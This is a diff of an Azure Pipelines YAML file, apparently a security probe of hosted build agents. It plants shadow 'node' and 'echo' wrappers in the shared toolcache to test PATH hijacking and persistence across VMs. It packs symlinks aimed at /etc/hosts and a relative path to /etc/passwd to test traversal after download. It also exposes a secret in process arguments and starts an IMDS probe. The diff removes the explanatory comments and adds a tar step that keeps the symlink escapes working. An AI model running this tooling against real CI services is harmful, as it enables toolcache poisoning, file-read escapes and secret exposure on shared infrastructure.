@@ -1,11 +1,4 @@
 # azure-pipelines.yml
-# One file that plants probes, publishes artifacts, and verifies impact in fresh jobs.
-# Focus areas:
-#  - Toolcache persistence & PATH hijack attempt
-#  - Artifact downloader symlink / traversal behavior
-#  - Secret-in-argv leakage probe
-#  - IMDS reachability from a containerized job
-# All steps are self-contained and publish small artifacts as proof.
 
 trigger:
 - main
@@ -15,17 +8,14 @@ pr:
 
 variables:
   VM_IMAGE: 'ubuntu-22.04'
-  # Unique run marker to correlate artifacts across jobs in this same pipeline run
   RUN_MARK: 'MARK_$(Build.BuildId)_$(System.JobAttempt)'
+  SYMLINK_ARCHIVE_NAME: 'symlink_payloads.tgz'
 
 stages:
 - stage: VulnProbes
   displayName: Forensics & Probes
   jobs:
 
-  # -----------------------------
-  # JOB 1: Seed + publish artifacts
-  # -----------------------------
   - job: seed_and_publish
     displayName: "Seed: toolcache, symlinks, and argv leak"
     pool:
@@ -42,18 +32,15 @@ stages:
           echo "--- /etc/os-release ---"; sed -n '1,200p' /etc/os-release || true
           echo
           echo "== Prepare artifacts tree =="
-          rm -rf artifacts-* || true
-          mkdir -p artifacts-symlink artifacts-argv artifacts-toolcache artifacts-seed
+          rm -rf artifacts-* out || true
+          mkdir -p artifacts-symlink artifacts-argv artifacts-toolcache artifacts-seed out
           echo "$(RUN_MARK) $(Build.QueuedBy) $(Build.SourceVersion)" | tee artifacts-seed/run_mark.txt
 
           echo
           echo "== Symlink payloads (safe targets) =="
-          # Absolute symlink pointing to host file (harmless on its own, used to test downloader behavior)
           ln -s /etc/hosts artifacts-symlink/abs_to_etc_hosts
-          # Relative symlink pointing up out of extraction directory (if downloader honors raw symlinks)
           mkdir -p artifacts-symlink/deep/inside
           ( cd artifacts-symlink/deep/inside && ln -s ../../../../etc/passwd rel_escape_to_etc_passwd )
-          # A file whose NAME looks traversal-ish (but is just a name in FS)
           touch 'artifacts-symlink/..__not_traversal__'
 
           echo
@@ -62,11 +49,9 @@ stages:
           TC_DIR="${AGENT_TOOLSDIRECTORY:-/opt/hostedtoolcache}"
           SHADOW_DIR="$TC_DIR/shadow/bin"
           mkdir -p "$SHADOW_DIR"
-          # Drop 'node' and 'echo' wrappers that log invocation to a file if ever executed
           cat > "$SHADOW_DIR/node" <<'EOF'
           #!/usr/bin/env bash
           echo "[shadow-node] invoked: $0 $*" >> "$HOME/shadow-invocations.log"
-          # behave enough like node to not explode most calls
           if command -v /usr/bin/node >/dev/null 2>&1; then exec /usr/bin/node "$@"; else exec node "$@"; fi
           EOF
           cat > "$SHADOW_DIR/echo" <<'EOF'
@@ -76,18 +61,15 @@ stages:
           EOF
           chmod +x "$SHADOW_DIR/node" "$SHADOW_DIR/echo"
 
-          # Write presence markers in a few common locations
           for p in /var/tmp /tmp "$TC_DIR" /usr/local/share ; do
             fn="$p/.${RUN_MARK}"
             (echo "${RUN_MARK} $(date -u +%FT%TZ)" > "$fn" 2>/dev/null && echo "wrote $fn") || echo "no perms for $p"
           done
 
-          # Save proof of world-writable perms for the toolcache
           (ls -ld "$TC_DIR" && ls -la "$TC_DIR") > artifacts-toolcache/toolcache_listing.txt
 
           echo
           echo "== Secret-argv leak probe setup =="
-          # If DUMMY_SECRET isn't pre-set in pipeline, generate one and mark as secret for subsequent steps
           if [ -z "${DUMMY_SECRET:-}" ]; then
             gen="dummy-$(openssl rand -hex 8 || date +%s%N)"
             echo "##vso[task.setvariable variable=DUMMY_SECRET;issecret=true]$gen"
@@ -97,6 +79,13 @@ stages:
           fi
         displayName: "Seed: identify, symlinks, toolcache, and secret init"
 
+      - bash: |
+          set -euo pipefail
+          # 🔧 Pack symlink folder so PublishPipelineArtifact doesn't touch symlinks directly
+          tar -czf "$(Build.SourcesDirectory)/$(SYMLINK_ARCHIVE_NAME)" -C artifacts-symlink .
+          ls -l "$(Build.SourcesDirectory)/$(SYMLINK_ARCHIVE_NAME)"
+        displayName: "Pack symlink payloads (tar.gz)"
+
       - task: PublishPipelineArtifact@1
         displayName: "Publish: toolcache proof"
         inputs:
@@ -105,9 +94,9 @@ stages:
           publishLocation: pipeline
 
       - task: PublishPipelineArtifact@1
-        displayName: "Publish: symlink payloads"
+        displayName: "Publish: symlink payloads (tar.gz)"
         inputs:
-          targetPath: artifacts-symlink
+          targetPath: '$(Build.SourcesDirectory)/$(SYMLINK_ARCHIVE_NAME)'   # <- publish the single file
           artifactName: symlink-proof
           publishLocation: pipeline
 
@@ -116,19 +105,14 @@ stages:
           echo "== First-party-style argv exposure check =="
           echo "Marker: ARGV_LEAK_$(Build.BuildId)_$$" | tee artifacts-argv/marker.txt
 
-          # Spawn a short-lived process that includes the secret in ARGV (simulates a task passing secrets via args)
-          # NOTE: Doing this intentionally to test if /proc reveals the value while the process runs.
           if [ -z "${DUMMY_SECRET:-}" ]; then
             echo "No DUMMY_SECRET available; skipping argv test." | tee -a artifacts-argv/argv.txt
             exit 0
           fi
 
-          # Run a child bash with the secret as an argument; in parallel, scan /proc for it.
           ( sleep 0.5; ps -eo pid,ppid,user,cmd | tee artifacts-argv/ps_snapshot.txt | grep -F -- "$DUMMY_SECRET" && echo "FOUND in ps" | tee -a artifacts-argv/argv.txt || echo "NOT_FOUND in ps" | tee -a artifacts-argv/argv.txt ) &
-
           /usr/bin/bash -c 'sleep 2' "${DUMMY_SECRET}" || true
 
-          # Also check /proc/<pid>/cmdline style for any survivors
           for pid in $(pgrep -f sleep || true); do
             tr '\0' ' ' < /proc/$pid/cmdline | tee -a artifacts-argv/cmdlines.txt || true
           done
@@ -145,17 +129,14 @@ stages:
           artifactName: argv-leak-proof
           publishLocation: pipeline
 
-  # ------------------------------------
-  # JOB 2: Fresh VM — test downloader & symlink handling
-  # ------------------------------------
   - job: download_and_validate
-    displayName: "Validate: artifact download behavior (symlinks/traversal)"
+    displayName: "Validate: symlink traversal after extraction"
     dependsOn: seed_and_publish
     pool:
       vmImage: $(VM_IMAGE)
     steps:
       - task: DownloadPipelineArtifact@2
-        displayName: "Download symlink-proof"
+        displayName: "Download symlink-proof (tar.gz)"
         inputs:
           buildType: 'current'
           artifactName: 'symlink-proof'
@@ -163,27 +144,33 @@ stages:
 
       - bash: |
           set -euo pipefail
-          echo "== Inspect downloaded files =="
+          echo "== Unpack symlink payloads =="
+          ls -l dl-symlink
+          mkdir -p dl-symlink/extracted
+          tar -xzf "dl-symlink/$(SYMLINK_ARCHIVE_NAME)" -C dl-symlink/extracted
+          echo "== Inspect extracted files =="
           mkdir -p artifacts-verify
-          ( set -x
-            ls -lR dl-symlink | sed -n '1,300p' | tee artifacts-verify/ls_dl.txt
-            file dl-symlink/* || true
-            # Show what the symlinks point to (if created as symlinks)
-            for f in dl-symlink/* dl-symlink/**/rel_escape_to_etc_passwd 2>/dev/null; do
-              [ -L "$f" ] && echo "$f -> $(readlink -f "$f")" | tee -a artifacts-verify/readlinks.txt || true
-            done
-            # Attempt to read through the symlink (this would read THIS VM's host file if symlink is honored)
-            for f in dl-symlink/abs_to_etc_hosts dl-symlink/deep/inside/rel_escape_to_etc_passwd ; do
-              if [ -e "$f" ]; then
-                echo "--- BEGIN $f ---" | tee -a artifacts-verify/cat_results.txt
-                (cat "$f" | head -n 10 || true) | tee -a artifacts-verify/cat_results.txt
-                echo "--- END $f ---" | tee -a artifacts-verify/cat_results.txt
-              else
-                echo "Missing $f" | tee -a artifacts-verify/cat_results.txt
-              fi
-            done
-          )
-        displayName: "Check if downloader restored symlinks and if they dereference"
+          ls -lR dl-symlink/extracted | sed -n '1,300p' | tee artifacts-verify/ls_dl.txt
+
+          echo "== Show symlink targets =="
+          find dl-symlink/extracted -type l -print -exec readlink -f {} \; | tee artifacts-verify/readlinks.txt
+
+          echo "== Attempt to read via symlinks (top 10 lines) =="
+          for f in \
+            dl-symlink/extracted/abs_to_etc_hosts \
+            dl-symlink/extracted/deep/inside/rel_escape_to_etc_passwd
+          do
+            if [ -e "$f" ]; then
+              {
+                echo "--- BEGIN $f ---"
+                head -n 10 "$f" || true
+                echo "--- END $f ---"
+              } | tee -a artifacts-verify/cat_results.txt
+            else
+              echo "Missing $f" | tee -a artifacts-verify/cat_results.txt
+            fi
+          done
+        displayName: "Unpack & check symlinks"
 
       - task: PublishPipelineArtifact@1
         displayName: "Publish: downloader verification"
@@ -192,9 +179,6 @@ stages:
           artifactName: symlink-download-proof
           publishLocation: pipeline
 
-  # ------------------------------------
-  # JOB 3: Fresh VM — persistence & toolcache hijack check
-  # ------------------------------------
   - job: persistence_check
     displayName: "Validate: cross-VM persistence & PATH hijack feasibility"
     dependsOn: seed_and_publish
@@ -220,9 +204,7 @@ stages:
           if [ -d "$TC_DIR/shadow/bin" ]; then
             export PATH="$TC_DIR/shadow/bin:$PATH"
             echo "PATH prepended with $TC_DIR/shadow/bin" | tee -a artifacts-persist/findings.txt
-            # If our shadow 'echo' exists, we should see the marker
             echo "invocation-test" | tee -a artifacts-persist/echo_out.txt
-            # If 'node' is shadowed, this will log into $HOME/shadow-invocations.log
             ( node -v || true ) | tee -a artifacts-persist/node_out.txt
             [ -f "$HOME/shadow-invocations.log" ] && cp "$HOME/shadow-invocations.log" artifacts-persist/ || true
           else
@@ -237,9 +219,6 @@ stages:
           artifactName: persistence-proof
           publishLocation: pipeline
 
-  # ------------------------------------
-  # JOB 4: Run inside a container and probe IMDS
-  # ------------------------------------
   - job: imds_from_container
     displayName: "Probe: IMDS reachability from job container"
     dependsOn: seed_and_publish
